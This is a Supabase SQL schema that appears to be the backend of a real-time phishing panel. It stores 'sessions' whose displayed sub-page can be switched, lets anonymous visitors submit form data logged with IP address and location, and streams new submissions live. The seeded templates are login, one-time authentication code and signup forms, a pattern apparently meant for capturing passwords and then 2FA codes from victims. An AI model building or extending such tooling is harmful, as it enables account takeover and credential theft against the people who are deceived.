
-- Create sessions table to store user sessions
CREATE TABLE public.sessions (
  id TEXT PRIMARY KEY,
  user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE,
  main_page_id TEXT NOT NULL,
  current_sub_page_id TEXT NOT NULL,
  page_type TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  active BOOLEAN DEFAULT true,
  has_new_data BOOLEAN DEFAULT false
);

-- Create session_data table to store form submissions
CREATE TABLE public.session_data (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id TEXT REFERENCES public.sessions(id) ON DELETE CASCADE,
  timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  ip_address TEXT,
  location TEXT,
  form_data JSONB,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create main_pages table to store page templates
CREATE TABLE public.main_pages (
  id TEXT PRIMARY KEY,
  name TEXT NOT NULL,
  description TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create sub_pages table to store sub-page templates
CREATE TABLE public.sub_pages (
  id TEXT PRIMARY KEY,
  main_page_id TEXT REFERENCES public.main_pages(id) ON DELETE CASCADE,
  name TEXT NOT NULL,
  description TEXT,
  fields TEXT[] DEFAULT '{}',
  html TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create user profiles table
CREATE TABLE public.profiles (
  id UUID PRIMARY KEY REFERENCES auth.users(id) ON DELETE CASCADE,
  full_name TEXT,
  avatar_url TEXT,
  updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Enable Row Level Security
ALTER TABLE public.sessions ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.session_data ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.main_pages ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.sub_pages ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;

-- RLS Policies for sessions
CREATE POLICY "Users can view own sessions" ON public.sessions
  FOR SELECT USING (auth.uid() = user_id);

CREATE POLICY "Users can create own sessions" ON public.sessions
  FOR INSERT WITH CHECK (auth.uid() = user_id);

CREATE POLICY "Users can update own sessions" ON public.sessions
  FOR UPDATE USING (auth.uid() = user_id);

CREATE POLICY "Users can delete own sessions" ON public.sessions
  FOR DELETE USING (auth.uid() = user_id);

-- RLS Policies for session_data
CREATE POLICY "Users can view own session data" ON public.session_data
  FOR SELECT USING (
    EXISTS (
      SELECT 1 FROM public.sessions 
      WHERE sessions.id = session_data.session_id 
      AND sessions.user_id = auth.uid()
    )
  );

CREATE POLICY "Anyone can insert session data" ON public.session_data
  FOR INSERT WITH CHECK (true);

-- RLS Policies for main_pages (public read, admin write)
CREATE POLICY "Anyone can view main pages" ON public.main_pages
  FOR SELECT USING (true);

CREATE POLICY "Authenticated users can manage main pages" ON public.main_pages
  FOR ALL USING (auth.uid() IS NOT NULL);

-- RLS Policies for sub_pages (public read, admin write)
CREATE POLICY "Anyone can view sub pages" ON public.sub_pages
  FOR SELECT USING (true);

CREATE POLICY "Authenticated users can manage sub pages" ON public.sub_pages
  FOR ALL USING (auth.uid() IS NOT NULL);

-- RLS Policies for profiles
CREATE POLICY "Users can view own profile" ON public.profiles
  FOR SELECT USING (auth.uid() = id);

CREATE POLICY "Users can update own profile" ON public.profiles
  FOR UPDATE USING (auth.uid() = id);

CREATE POLICY "Users can insert own profile" ON public.profiles
  FOR INSERT WITH CHECK (auth.uid() = id);

-- Insert default main pages and sub pages
INSERT INTO public.main_pages (id, name, description) VALUES
('login', 'Authentication Pages', 'Various authentication page templates'),
('signup', 'Registration Pages', 'User registration templates');

INSERT INTO public.sub_pages (id, main_page_id, name, description, fields, html) VALUES
('login1', 'login', 'Email & Password Login', 'Standard email and password login form', 
 ARRAY['email', 'password'],
 '<div class="p-6"><h1 class="text-2xl font-bold mb-4">Login</h1><div class="mb-4"><label class="block mb-2">Email</label><input type="email" name="email" class="w-full p-2 border rounded" required /></div><div class="mb-4"><label class="block mb-2">Password</label><input type="password" name="password" class="w-full p-2 border rounded" required /></div><button type="submit" class="bg-purple-600 text-white px-4 py-2 rounded">Submit</button></div>'),

('login2', 'login', 'Authentication Code', 'Single auth code input form',
 ARRAY['auth_code'],
 '<div class="p-6"><h1 class="text-2xl font-bold mb-4">Enter Authentication Code</h1><div class="mb-4"><label class="block mb-2">Auth Code</label><input type="text" name="auth_code" class="w-full p-2 border rounded" required /></div><button type="submit" class="bg-purple-600 text-white px-4 py-2 rounded">Submit</button></div>'),

('signup1', 'signup', 'Basic Registration', 'Standard registration form',
 ARRAY['name', 'email', 'password', 'confirm_password'],
 '<div class="p-6"><h1 class="text-2xl font-bold mb-4">Create Account</h1><div class="mb-4"><label class="block mb-2">Full Name</label><input type="text" name="name" class="w-full p-2 border rounded" required /></div><div class="mb-4"><label class="block mb-2">Email</label><input type="email" name="email" class="w-full p-2 border rounded" required /></div><div class="mb-4"><label class="block mb-2">Password</label><input type="password" name="password" class="w-full p-2 border rounded" required /></div><div class="mb-4"><label class="block mb-2">Confirm Password</label><input type="password" name="confirm_password" class="w-full p-2 border rounded" required /></div><button type="submit" class="bg-purple-600 text-white px-4 py-2 rounded">Register</button></div>'),

('signup2', 'signup', 'Newsletter Signup', 'Email newsletter registration',
 ARRAY['email'],
 '<div class="p-6"><h1 class="text-2xl font-bold mb-4">Join Our Newsletter</h1><div class="mb-4"><label class="block mb-2">Email Address</label><input type="email" name="email" class="w-full p-2 border rounded" required /></div><button type="submit" class="bg-purple-600 text-white px-4 py-2 rounded">Subscribe</button></div>');

-- Create function to handle new user signup
CREATE OR REPLACE FUNCTION public.handle_new_user()
RETURNS TRIGGER AS $$
BEGIN
  INSERT INTO public.profiles (id, full_name)
  VALUES (NEW.id, NEW.raw_user_meta_data->>'full_name');
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- Create trigger for new user signup
CREATE OR REPLACE TRIGGER on_auth_user_created
  AFTER INSERT ON auth.users
  FOR EACH ROW EXECUTE FUNCTION public.handle_new_user();

-- Enable realtime for sessions and session_data
ALTER TABLE public.sessions REPLICA IDENTITY FULL;
ALTER TABLE public.session_data REPLICA IDENTITY FULL;

-- Add tables to realtime publication
ALTER PUBLICATION supabase_realtime ADD TABLE public.sessions;
ALTER PUBLICATION supabase_realtime ADD TABLE public.session_data;
